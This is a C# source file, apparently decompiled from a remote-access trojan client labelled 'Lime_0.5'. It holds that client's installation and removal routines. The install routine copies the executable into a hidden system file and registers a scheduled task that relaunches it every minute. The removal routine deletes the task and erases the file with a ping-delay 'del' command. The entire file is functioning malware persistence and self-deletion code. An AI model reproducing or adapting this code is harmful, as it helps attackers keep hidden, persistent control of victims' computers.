using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Client_0._5;

public class C_Installation
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void INS()
	{
		if (C_Settings.DROP)
		{
			if (!Operators.ConditionalCompareObjectNotEqual((object)Application.get_ExecutablePath(), C_Settings.fullpath, false))
			{
				return;
			}
			try
			{
				if (!Directory.Exists(Interaction.Environ(C_Settings.PATH1) + "\\" + C_Settings.PATH2))
				{
					Directory.CreateDirectory(Interaction.Environ(C_Settings.PATH1) + "\\" + C_Settings.PATH2);
				}
				else if (File.Exists(Conversions.ToString(C_Settings.fullpath)))
				{
					File.Delete(Conversions.ToString(C_Settings.fullpath));
				}
				FileStream fileStream = new FileStream(Conversions.ToString(C_Settings.fullpath), FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(Application.get_ExecutablePath());
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				File.SetAttributes(Conversions.ToString(C_Settings.fullpath), FileAttributes.Hidden | FileAttributes.System);
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /f /sc minute /mo 1 /tn Lime_0.5 /tr ", C_Settings.fullpath), (object)"")), (AppWinStyle)0, false, -1);
				object[] array2;
				bool[] array3;
				NewLateBinding.LateCall((object)null, typeof(Process), "Start", array2 = new object[1] { C_Settings.fullpath }, (string[])null, (Type[])null, array3 = new bool[1] { true }, true);
				if (array3[0])
				{
					C_Settings.fullpath = RuntimeHelpers.GetObjectValue(array2[0]);
				}
				ProjectData.EndApp();
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		C_Settings.fullpath = Application.get_ExecutablePath();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void DEL()
	{
		try
		{
			if (C_Settings.DROP)
			{
				File.SetAttributes(Conversions.ToString(C_Settings.fullpath), FileAttributes.Normal);
				Thread.Sleep(50);
				Interaction.Shell("schtasks /Delete /tn Lime_0.5 /F", (AppWinStyle)0, false, -1);
				Thread.Sleep(50);
			}
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /c ping 0 -n 2 & del \"", C_Settings.fullpath), (object)"\"")), (AppWinStyle)0, false, -1);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
